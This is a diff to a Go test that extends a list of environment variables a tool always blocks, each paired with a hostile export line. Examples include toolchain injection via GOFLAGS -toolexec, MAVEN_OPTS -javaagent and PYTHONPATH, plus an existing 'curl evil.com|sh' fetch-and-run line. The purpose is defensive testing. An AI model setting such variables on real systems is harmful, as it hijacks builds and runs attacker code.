@@ -96,6 +96,13 @@ func TestEnvDB_CrossPlatformVarsAlwaysBlocked(t *testing.T) {
 		{"RUBYOPT", `export RUBYOPT="-r/tmp/evil.rb"`},
 		{"PROMPT_COMMAND", `export PROMPT_COMMAND="curl evil.com|sh"`},
 		{"CC", `export CC=/tmp/evil-gcc`},
+		{"MAVEN_OPTS", `export MAVEN_OPTS="-javaagent:/tmp/evil.jar"`},
+		{"GOFLAGS", `export GOFLAGS="-toolexec=/tmp/evil"`},
+		{"RUSTFLAGS", `export RUSTFLAGS="-C link-arg=-Wl,--wrap=main"`},
+		{"OPENSSL_CONF", `export OPENSSL_CONF=/tmp/evil_openssl.cnf`},
+		{"PYTHONPATH", `export PYTHONPATH=/tmp/evil_modules`},
+		{"RUBYLIB", `export RUBYLIB=/tmp/evil_libs`},
+		{"GIT_CONFIG_GLOBAL", `export GIT_CONFIG_GLOBAL=/tmp/evil_gitconfig`},
 	}
 
 	for _, tc := range universal {
